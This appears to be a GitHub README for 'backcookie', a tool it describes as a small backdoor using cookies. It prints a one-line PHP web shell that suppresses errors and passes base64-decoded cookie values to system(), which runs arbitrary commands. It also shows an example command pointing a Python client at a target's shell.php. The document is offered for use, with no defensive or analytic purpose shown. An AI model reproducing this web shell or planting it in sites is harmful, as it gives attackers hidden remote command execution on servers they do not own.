backcookie
==========

[![Total views](https://sourcegraph.com/api/repos/github.com/mrjopino/Backcookie/counters/views.png)](https://sourcegraph.com/github.com/mrjopino/Backcookie)

Small backdoor using cookie.

==========

```php
<?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?>
```

```
Example: python backcookie.py http://target.com/shell.php
```

## Developer

-------------

Copyright, 2013 by [José Pino](http://twitter.com/mrjopino)

-------------
